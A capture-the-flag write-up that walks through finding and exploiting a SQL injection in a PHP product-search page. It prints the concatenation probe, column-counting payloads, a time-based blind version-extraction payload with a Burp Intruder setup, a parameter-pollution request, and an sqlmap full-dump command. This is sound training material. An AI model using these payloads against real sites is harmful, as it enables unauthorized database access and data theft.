## Polluted Pathways: From Innocent Parameters to Malicious SQL

Hello all! This past weekend I had the opportunity to participate in PlexHax's CTF event hosted by PlexTrac. I thoroughly enjoyed working through the available challenges and wanted to document the solution to the 'myapp' challenge. 

![](https://miro.medium.com/v2/resize:fit:627/1*OBtegrwInvE-DLh39uORzQ.png)

When first navigating to the target application, a search page is rendered allowing the user to search for different products based on attributes such as Price, Category, and Product Name. 

![](https://miro.medium.com/v2/resize:fit:437/1*7R4eB6Mlq74sWKi4mcBbrQ.png)

During the manual testing process, a noteworthy behavior emerges: the application seems to accept string concatenation. Specifically, the input fields appear to treat the `'+'` character as a legitimate means of concatenating strings. This behavior becomes evident when the input `'te'+'st'` results in the display of the word `'test'`.

The recognition of this string concatenation behavior is a significant clue. It implies that the application's backend likely constructs SQL queries by merging strings, potentially leading to a vulnerability known as SQL injection (SQLi). In SQL injection attacks, attackers exploit the application's inadequate handling of input, tricking it into executing unintended SQL queries.

**HTTP Request**
```HTTP
GET /search.php?attribute=product_name&query=hoo'+'die HTTP/2

Host: myapp.plexhax.com
```

**HTTP Response:**
```HTTP
HTTP/2 200 OK
X-Powered-By: PHP/7.4.33
Alt-Svc: h3=":443"; ma=86400

<!-- search.php -->
Product Name: hoodie - Price: $10.99<br>
```

To validate the presence of the SQLi vulnerability and delve deeper into its implications, we can adapt the _ORDER BY_ technique into a blind scenario. In a blind situation, the attacker doesn't receive direct error messages or database outputs but relies on how the application responds to crafted queries. 

By injecting ORDER BY clauses with numeric indices and observing the application response, we can solidify if the user-supplied input is influencing the SQL query execution. If vulnerable, we can also deduce valuable information, such as the number of columns in the query, the data types of columns, and more. 

```SQL
1' GROUP BY 1--+	#True
1' GROUP BY 2--+	#True
1' GROUP BY 3--+	#True
1' GROUP BY 4--+	#False - Query is only using 3 columns
```

When iteratively modifying the payload `hoodie'+ORDER BY 3--+` was supplied, the application displayed the results as expected. However, when supplying 4 columns the application unexpectedly refrained from displaying the results. This distinctive behavior indicates that ordering by the fourth column yielded no matching outcomes.    

**HTTP Requests:**
```HTTP
GET /search.php?attribute=product_name&query=hoodie'+ORDER+BY+3--+ HTTP/2
Host: myapp.plexhax.com
```

**HTTP Response:**
```HTTP
HTTP/2 200 OK
Date: Thu, 17 Aug 2023 17:44:38 GMT
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/7.4.33

<!-- search.php -->
Product Name: hoodie - Price: $10.99<br>
```

**False HTTP Request**:
```HTTP
GET /search.php?attribute=product_name&query=hoodie'+ORDER+BY+4--+ HTTP/2
Host: myapp.plexhax.com
```

**HTTP Response:**
```HTTP
HTTP/2 200 OK
Date: Thu, 17 Aug 2023 17:44:38 GMT
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/7.4.33

<!-- search.php -->
No products found.
```


While presumptions about the database management system (DBMS) can be inferred, we can extract the version number utilizing a blind technique which can play a pivotal role in understanding the technology stack and any associated vulnerabilities. 

To achieve this, we can utilize the power of conditional statements within SQL queries. Conditional statements enable the application to execute different actions based on a specified condition. In this case, the goal was to create a statement that would selectively trigger an action based on the DBMS version number. 
```SQL
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`
```

A common technique to extract this information involves the use of the `MID()` function. The following payload was employed:

```SQL
GET /search.php?attribute=product_name&query=hoodie' OR IF(MID(@@version,1,1)='5',sleep(10),1)='2
```

Here, `@@version` refers to the DBMS version string, and `MID()` extracts the first character of the version and checks if it's equal to '5'. If the condition is true, the database will pause for 10 seconds, if not, the application response time should be `normal`.

This is a great task for Burp Intruder, a tool capable of automating repetitive HTTP requests, and inserting customized payloads into designated positions iteratively. Capture the search request and forward it to Intruder.

![](https://miro.medium.com/v2/resize:fit:627/1*ZlruPhSvQoq32sX-dmunqA.png)

Modify the attack type to use `Cluster Bomb` which allows for multiple positions to be iteratively tested based on the supplied payloads, providing all possible permutations. 

```HTTP
GET /search.php?attribute=product_name&query=hoodie'+OR+IF(MID(%40%40version,§1§,1)%3d'§5§',sleep(10),1)%3d'2 HTTP/2

```

`§1§`: A marker representing the position within the string where the first character of the version number is located.

`§5§`: A marker representing the position within the string where the specific character we're comparing to is located.

Add a new payload marker to the version number we're attempting to check (5), and the first character of @@version (1) as shown above.

Select the payloads tab and use the `Numbers` payload type for both of our payload sets. Define our range from 0-10 with a step of 1 to iterate through all numbers and start the attack. 

![](https://miro.medium.com/v2/resize:fit:627/1*eR7opk9UgPQffrRHYgbpOw.png)

The "Cluster Bomb" attack type facilitates the systematic iteration through various values at specific positions within the payload. By selecting the "Numbers" payload type and defining the range from 0 to 10 with a step of 1, the attack will execute the payload with each number in the defined range, substituting the markers accordingly.

Once the attack is initiated, the results are captured and presented for analysis. In this scenario, the "Columns" tab becomes invaluable. This tab allows the inclusion of "Response Received" and "Completed Times," providing a comprehensive overview of how the application responded to each iteration of the attack.

The conditional logic set up in the payload comes into play here. As each iteration runs, it supplies a new number to be referenced in the conditional statement, assessing whether the behavior changes in response to the modified payloads. Filtering the requests by "Response Completed" will showcase a few requests with significantly longer response times indicating that our conditional statement succeeded causing the DBMS to sleep for 10 seconds. 

Now that we've extracted some important information using manual testing, we can have `sqlmap` begin to fingerprint the DBMS and fetch data from the DB. 

It's important to note during this testing, I managed to discover HTTP Parameter Pollution (HPP) for the `query` parameter. Though HPP vulnerabilities don't directly cause SQLi vulnerabilities, they can open up additional attack vectors and allow exploitation through previously tested parameters. 

![](https://miro.medium.com/v2/resize:fit:627/1*Zpv-DX5medrtwoneCOlqaQ.png)

I included the additional query parameter and saved the HTTP request to a file titled 'request.txt'.

```HTTP
GET /search.php?attribute=product_name&query=test&query= HTTP/2
Host: myapp.plexhax.com
```

```bash
sqlmap -r request.txt -a -p query
```

![](https://miro.medium.com/v2/resize:fit:533/1*d-pWtxrGmm6W3kSZ3eOvWQ.png)

And there is our ~~flag~~! As you may have noticed from the challenge description, the flag is only obtained after using this value as the *report name* through their reporting platform. Once submitted, the redeemable flag is presented.  
